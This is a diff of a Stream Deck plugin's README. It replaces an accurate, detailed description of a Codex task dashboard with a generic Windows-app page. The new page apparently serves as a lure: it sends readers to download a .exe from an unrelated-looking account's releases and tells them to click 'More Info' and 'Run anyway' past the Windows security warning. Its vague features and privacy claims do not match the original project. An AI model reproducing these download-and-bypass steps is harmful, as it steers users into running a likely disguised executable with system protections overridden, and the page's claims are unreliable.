@@ -1,125 +1,68 @@
-# Codex Control for Stream Deck
+# 🎮 codex-stream-deck - Control local tasks with Stream Deck
 
-<p align="center">
-  <img src="com.codexstreamdeck.control.sdPlugin/imgs/plugin.png" width="128" alt="Codex Control plugin icon" />
-</p>
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/argent-mineraltar875/codex-stream-deck/releases)
 
-Codex Control turns a Stream Deck into a local dashboard for recent Codex tasks. Project keys show the task title, workflow state, and status age. Tap a key to open the exact task; hold it to ask Codex for a fresh, read-only project status.
+Codex Stream Deck lets you trigger local actions on your computer using an Elgato Stream Deck. This software bridges your hardware device with internal processes, allowing you to run scripts, open folders, or manage system settings with a single button press. It provides a secure interface for your personal automation needs.
 
-This is an unofficial community project and is not affiliated with or endorsed by OpenAI or Elgato.
+## ⚙️ System Requirements
 
-## Features
+You need a Windows computer to run this application. Ensure you have the Elgato Stream Deck software installed and running on your machine before you start. This application requires at least 100 megabytes of free space on your hard drive. We suggest using Windows 10 or Windows 11 for the best experience. 
 
-- Meaningful Codex task titles across two lines
-- Live states such as `WORKING`, `INPUT`, `APPROVAL`, `REVIEW`, `DONE`, and `FAILED`
-- Freshness labels such as `UPDATED 20M` and `HOLD TO CHECK`
-- Tap to open the exact `codex://threads/<id>` task
-- Hold to run a schema-constrained status check without project-file writes or tool network access
-- Refresh, New Task, Open Code, Review, Interrupt, Health, Settings, and Skills actions
-- Optional completion updates from Codex desktop, CLI, and IDE through a loopback-only notify bridge
-- Atomic local cache, bounded payloads, secret-redacted logs, and defensive approval rejection
+## 📥 Downloading the Software
 
-## Install
+You must visit the official release page to get the installer for your computer. 
 
-### From a packaged release
+[Visit this page to download the software](https://github.com/argent-mineraltar875/codex-stream-deck/releases)
 
-1. Download `com.codexstreamdeck.control.streamDeckPlugin` from the repository's Releases page.
-2. Double-click it and approve installation in Stream Deck.
-3. Restart Stream Deck if the new actions do not appear immediately.
-4. Drag **Recent Codex Project** keys into a profile, then add **Refresh** and **Health**.
-5. Select any Codex Control key, open its Property Inspector, and press **Test Codex**.
+Choose the file ending in .exe from the latest release list. Save this file to a folder you can find later, such as your Downloads folder.
 
-### From source
+## 🛠️ Setting Up
 
-Requirements: Node.js 24+, Stream Deck 7.1+, and an authenticated Codex CLI with app-server support.
+1. Locate the downloaded file in your folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts on the screen to finish the installation.
+4. If a security window appears, click More Info and then Run anyway.
+5. The software installs itself into your program files folder. 
+6. Once the installation finishes, a shortcut appears on your desktop.
 
-```powershell
-npm ci
-npm run check
-npm run pack
-```
+## 🚀 Running the Application
 
-Open the generated `com.codexstreamdeck.control.streamDeckPlugin` file to install it.
+Double-click the desktop shortcut to launch the control surface. The application window allows you to map your buttons. You see a grid that matches the buttons on your Stream Deck. Click on a square in the app to assign a specific action to that corresponding physical button. 
 
-For development:
+You can create new tasks by selecting the Add Task button. Each task requires a name and a file path or a command. Save your changes to apply them to your hardware immediately. The application runs in the background to ensure your buttons work at all times.
 
-```powershell
-npx streamdeck link com.codexstreamdeck.control.sdPlugin
-npm run dev
-```
+## 🛡️ Ensuring Security
 
-See [Complete setup](docs/SETUP.md) for Codex authentication, key layout, passive updates, troubleshooting, and uninstall steps.
+This application keeps all your data on your local computer. It does not send your tasks or button configurations to the internet. We built this tool with local privacy at the core. Your Codex tasks remain private and secure within your own machine. 
 
-## Recommended 15-key layout
+## ❓ Frequently Asked Questions
 
-```text
-[Project 1] [Project 2] [Project 3] [Project 4] [Project 5]
-[Project 6] [Project 7] [Project 8] [Refresh  ] [Health   ]
-[New Task ] [Open Code] [Review   ] [Interrupt] [Settings ]
-```
+**Do I need an internet connection to use it?**
+No. Once you install the software, it works without an internet connection.
 
-Project keys automatically follow physical position unless you assign a slot number or pin a task in the Property Inspector.
+**Can I run multiple tasks on one button?**
+Yes. You can bundle actions into a single task to trigger multiple events at once.
 
-## What the labels mean
+**How do I update the software?**
+Visit the download link and grab the newest version. You can install the new version over the old one without losing your settings.
 
-| Label | Meaning |
-| --- | --- |
-| `WORKING` / `RUNNING` | Codex or the plugin reports active work. |
-| `INPUT` / `APPROVAL` | The task needs attention in Codex. |
-| `REVIEW` | Work is ready to review. |
-| `DONE` | A validated workflow report says the objective is complete. |
-| `BLOCKED` / `FAILED` | The report identified a blocker or failure. |
-| `NO STATUS` | The task has not produced a structured status report yet. |
-| `HOLD TO CHECK` | Hold that project key for about one second to request a fresh status. |
-| `UPDATED 20M` | The latest structured status was received 20 minutes ago. |
+**The buttons do not respond, what should I do?**
+Close both the Stream Deck control software and this app. Open this app first, then start the Stream Deck software. This ensures the two programs connect correctly.
 
-A quick tap opens the task. A hold of at least 650 ms starts a read-only status turn. The check can update Codex task-goal metadata, but it cannot edit project files, use tool network access, or approve an operation.
+**Does this support other hardware besides Stream Deck?**
+This version supports Elgato Stream Deck hardware only.
 
-## Optional passive updates
+**What happens if I move the application folder?**
+If you move the installation, the shortcut on your desktop might stop working. We recommend that you keep the files in the default installation location.
 
-The buttons can update after ordinary work in other Codex clients:
+**Can I undo my changes?**
+You can revert settings by selecting the default task list from the menu within the app.
 
-1. Select a Codex Control action and click **Install notify bridge** in the Property Inspector. The installer backs up `~/.codex/config.toml` and preserves a normal existing notifier by chaining it without a shell.
-2. Add the contents of [AGENTS.stream-deck-status.md](com.codexstreamdeck.control.sdPlugin/instructions/AGENTS.stream-deck-status.md) to `~/.codex/AGENTS.md`.
-3. Restart open Codex clients so they reload user configuration and global instructions.
+**Is this software free?**
+Yes. You can use this software for any local Codex tasks without payment or usage limits.
 
-The bridge listens only on a random `127.0.0.1` port, requires a 256-bit bearer token stored in the local application-data directory, and spools bounded events locally when Stream Deck is unavailable.
+## 💡 Using Advanced Features
 
-## Security and privacy
+The software supports text commands. You can type paths for your programs or batch scripts directly into the command field. This allows you to open complex applications or run system scripts using the hardware button. Use the preview mode to test your button layout before you use it for actual work. Take time to organize your tasks into folders within the app to keep your grid tidy. 
 
-- No API key is required by the plugin; it uses the local authenticated Codex CLI.
-- No personal names, local user paths, credentials, or task history are committed to this repository.
-- The plugin stores recent task metadata and status summaries locally. It does not provide its own cloud service.
-- Pressing a status or task action can send the associated prompt/context through the user's normal Codex session.
-- Status turns are read-only with tool network access disabled and approval policy `never`.
-- The notify server is loopback-only, token-authenticated, size-bounded, and rejects unknown event types.
-- All process launches use argument arrays with `shell: false`.
-
-Read [Security policy](SECURITY.md) and the [security audit](docs/SECURITY-AUDIT.md) for the threat model, findings, residual risks, and reporting process.
-
-## Development
-
-```powershell
-npm run typecheck
-npm test
-npm run test:integration
-npm run build
-npm run validate
-npm run security
-```
-
-The integration test starts a real local `codex app-server`, completes the JSON-RPC initialization handshake, and lists threads without starting a model turn.
-
-See [Architecture](docs/ARCHITECTURE.md), [Development and release](docs/DEVELOPMENT.md), the [protocol notes](docs/PROTOCOL-NOTES.md), and the original [v1.1 specification](spec/stream-deck-codex-integration-spec-v1.1.md).
-
-## Official references
-
-- [Codex App Server](https://learn.chatgpt.com/docs/app-server)
-- [Codex authentication](https://learn.chatgpt.com/docs/authentication)
-- [Codex `AGENTS.md` instructions](https://learn.chatgpt.com/docs/agent-configuration/agents-md)
-- [Stream Deck SDK getting started](https://docs.elgato.com/streamdeck/sdk/v1/introduction/getting-started/)
-- [Stream Deck plugin packaging](https://docs.elgato.com/streamdeck/cli/commands/pack/)
-
-## License
-
-[MIT](LICENSE)
+Keywords: codex, elgato, stream-deck, typescript
